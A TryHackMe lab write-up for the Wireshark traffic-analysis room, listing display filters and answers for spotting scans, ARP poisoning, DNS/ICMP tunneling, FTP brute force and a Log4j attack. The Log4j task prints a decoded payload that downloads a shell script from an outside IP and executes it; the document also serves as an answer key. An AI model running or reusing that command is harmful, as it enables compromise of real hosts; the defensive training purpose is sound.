# Wireshark: Traffic Analysis - TryHackMe

> Learn traffic analysis techniques to detect network anomalies and attacks

**Room Link:** https://tryhackme.com/room/wiresharktrafficanalysis

<img width="1211" height="928" alt="image" src="https://github.com/user-attachments/assets/86e58004-1c8c-4e60-9a84-929e82f74136" />


---

## Task 1: Introduction

**Prerequisites:**
- Wireshark: The Basics
- Wireshark: Packet Operations

**Goal:** Detect anomalies and malicious activities in network traffic.

**No answer needed**

---

## Task 2: Nmap Scans

**File:** `Exercise.pcapng` (nmap folder)

### Questions

**Q1: Total number of "TCP Connect" scans?**

**Filter:**
```
tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size > 1024
```

**Explanation:**
- SYN flag set, ACK not set
- Window size > 1024
- TCP Connect scan pattern

- Answer: `1000`

---

**Q2: Which scan type is used to scan TCP port 80?**

**Filter:**
```
tcp.port == 80
```

Check packet details for scan type.

- Answer: `TCP Connect`

---

**Q3: How many "UDP close port" messages?**

**Filter:**
```
icmp.type == 3 and icmp.code == 3
```

**Explanation:**
- ICMP Type 3 = Destination Unreachable
- ICMP Code 3 = Port Unreachable

- Answer: `1083`

---

**Q4: Which UDP port in 55-70 range is open?**

**Filter:**
```
udp.dstport >= 50 and udp.port <= 70
```

Analyze ICMP errors for each port.

Ports 67, 53, 69 show unreachable.

Port 68 = no ICMP error = open.

- Answer: `68`

---

## Task 3: ARP Poisoning & MITM

**File:** `Exercise.pcapng` (arp folder)

### Questions

**Q1: Number of ARP requests crafted by attacker?**

**Step 1 - Find attacker:**
```
arp.duplicate-address-detected or arp.duplicate-address-frame
```

**Attacker MAC:** 00:0c:29:e2:18:b4

**Step 2 - Count ARP requests:**
```
arp.opcode == 1 and arp.src.hw_mac == 00:0c:29:e2:18:b4
```

- Answer: `284`

---

**Q2: Number of HTTP packets received by attacker?**

**Filter:**
```
http and eth.addr == 00:0c:29:e2:18:b4
```

**Note:** Use MAC address, not IP (spoofed).

- Answer: `90`

---

**Q3: Number of sniffed username & password entries?**

**Filter:**
```
urlencoded-form matches ".+"
```

**Explanation:**
- Matches any non-empty form data
- POST requests with credentials

Count entries with credentials in HTML Form URL Encoded section.

- Answer: `6`

---

**Q4: Password of "Client986"?**

**Filter:**
```
urlencoded-form matches "client986"
```

Check HTML Form URL Encoded section.

- Answer: `clientnothere!`

---

**Q5: Comment provided by "Client354"?**

**Filter:**
```
urlencoded-form matches "client354"
```

- Answer: `Nice work!`

---

## Task 4: Identifying Hosts

### DHCP and NetBIOS

**File:** `dhcp-netbios.pcap`

**Q1: MAC address of host "Galaxy A30"?**

**Filter:**
```
dhcp.option.hostname contains "A30"
```

- Answer: `9a:81:41:cb:96:6c`

---

**Q2: NetBIOS registration requests from "LIVALJM"?**

**Filter:**
```
nbns.flags.opcode == 5 and nbns.name contains "LIVALJM"
```

- Answer: `16`

---

**Q3: Which host requested IP 172.16.13.85?**

**Filter:**
```
dhcp.option.dhcp == 3 && dhcp.option.requested_ip_address == 172.16.13.85
```

Add "Host Name" as column if needed.

- Answer: `Galaxy-A12`

---

### Kerberos

**File:** `kerberos.pcap`

**Q4: IP address of user "u5"? (defanged)**

**Filter:**
```
kerberos.CNameString contains "u5"
```

Defang with CyberChef.

- Answer: `10[.]1[.]12[.]2`

---

**Q5: Hostname in Kerberos packets?**

**Filter:**
```
kerberos.CNameString contains "$"
```

**Note:** Names ending with "$" = hostnames

- Answer: `xp1$`

---

## Task 5: Tunneling Traffic

### ICMP Tunneling

**File:** `icmp-tunnel.pcap`

**Q1: Protocol used in ICMP tunnelling?**

**Filter:**
```
(data.len > 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http")
```

Check packet bytes pane for protocol strings.

- Answer: `SSH`

---

### DNS Tunneling

**File:** `dns.pcap`

**Q2: Suspicious domain receiving anomalous DNS queries? (defanged)**

**Filter:**
```
dns.qry.name.len > 40 and !mdns && dns.qry.name contains ".com"
```

**Explanation:**
- Long DNS names = suspicious
- Filter by length > 40 characters

Defang domain with CyberChef.

- Answer: `dataexfil[.]com`

---

## Task 6: FTP Analysis

**File:** `ftp.pcap`

### Questions

**Q1: How many incorrect login attempts?**

**Filter:**
```
ftp.response.code == 530
```

**Code 530** = Login incorrect

- Answer: `737`

---

**Q2: Size of file accessed by "ftp" account?**

**Filter:**
```
ftp.response.code == 213
```

**Code 213** = File status (includes size)

Check "arg" value for file size in bytes.

- Answer: `39424`

---

**Q3: Filename of uploaded document?**

**Filter:**
```
ftp.request.command == "RETR"
```

**RETR** = Retrieve/download command

**Note:** STOR = upload command

- Answer: `resume.doc`

---

**Q4: Command to change file permissions?**

**Filter:**
```
ftp contains "CHMOD"
```

- Answer: `CHMOD 777`

---

## Task 7: HTTP Analysis

### User Agents

**File:** `user-agent.cap`

**Q1: Number of anomalous user-agent types?**

**Filter:**
```
http.user_agent
```

Add "User-Agent" as column.

**Anomalous agents found:**
1. Windows NT 6.4 (doesn't exist)
2. Nmap Scripting Engine
3. Wfuzz/2.4
4. sqlmap/1.4
5. ${jndi:ldap://...} (Log4j exploit)
6. Firefox/100.0 (check context)

- Answer: `6`

---

**Q2: Packet with spelling difference in user agent?**

Manually inspect user agents.

Look for subtle typos.

- Answer: `52`

---

### Log4j Attack

**File:** `http.pcapng`

**Q3: Packet number of Log4j attack start?**

**Filter:**
```
(http.user_agent contains "$") or (http.user_agent contains "==")
```

Look for Base64 encoded payload in User-Agent.

- Answer: `444`

---

**Q4: IP address contacted by adversary? (defanged)**

Decode Base64 from User-Agent:
```
wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
```

Defang the IP.

- Answer: `62[.]210[.]130[.]250`

---

## Task 8: HTTPS Decryption

**File:** `Exercise.pcap`

### Questions

**Q1: Frame number of "Client Hello" to accounts.google.com?**

**Filter:**
```
(http.request or tls.handshake.type == 1) and !(ssdp)
```

**tls.handshake.type == 1** = Client Hello

- Answer: `16`

---

**Q2: Number of HTTP2 packets?**

**Steps:**
1. Edit → Preferences → Protocols → TLS
2. Add KeysLogFile.txt
3. Filter: `http2`

- Answer: `115`

---

**Q3: Authority header in Frame 322? (defanged)**

Press Ctrl+G → Go to packet 322

Check packet details for authority header.

- Answer: `safebrowsing[.]googleapis[.]com`

---

**Q4: What is the flag?**

File → Export Objects → HTTP

Check suspicious files.

Look in packet details → Line-based text data.

- Answer: `FLAG{THM-PACKETMASTER}`

---

## Task 9: Hunt Credentials

**File:** `Bonus-exercise.pcap`

### Questions

**Q1: Packet number with HTTP Basic Auth credentials?**

Tools → Credentials

Or filter: `http.authbasic`

- Answer: `237`

---

**Q2: Packet with empty password submission?**

Check Credentials window.

Look for empty "Request arg" field.

**Alternative filter:**
```
ftp.request.command == "PASS"
```

Find entry with no password value.

- Answer: `170`

---

## Task 10: Firewall Rules

**File:** `Bonus-exercise.pcap`

### Questions

**Q1: Rule for denying source IPv4 (packet 99)?**

Tools → Firewall ACL Rules

Select IPFirewall (ipfw)

- Answer: `add deny ip from 10.121.70.151 to any in`

---

**Q2: Rule for allowing destination MAC (packet 231)?**

Unselect "Deny"

Select packet 231

- Answer: `add allow MAC 00:d0:59:aa:af:80 any in`

---

### ICMP Codes

- Type 3 = Destination Unreachable
- Code 3 = Port Unreachable

### FTP Response Codes

- 213 = File status
- 530 = Login incorrect

### Detection Patterns

**ARP Poisoning:**
- Duplicate MAC addresses
- High ARP request volume

**MITM:**
- Spoofed IP addresses
- Intercepted credentials

**Tunneling:**
- Unusual data lengths
- Encoded payloads
- Long DNS names

**Scanning:**
- SYN without ACK
- Multiple port attempts
- ICMP unreachable responses

---

## Key Takeaways

- **TCP Connect** scans use SYN flag
- **ICMP Type 3 Code 3** = port unreachable
- **ARP duplicate detection** finds MITM attacks
- **urlencoded-form** contains POST data
- **DHCP** reveals hostnames
- **Kerberos names with $** are hostnames
- **Long ICMP packets** = tunneling
- **Long DNS queries** = data exfiltration
- **FTP code 530** = failed login
- **CHMOD 777** gives full permissions
- **Log4j** uses Base64 encoded payloads
- **TLS key log** decrypts HTTPS
- **HTTP Basic Auth** sends cleartext credentials
- **Firewall ACL rules** created from packets

Master traffic analysis to catch attackers
Happy hunting!
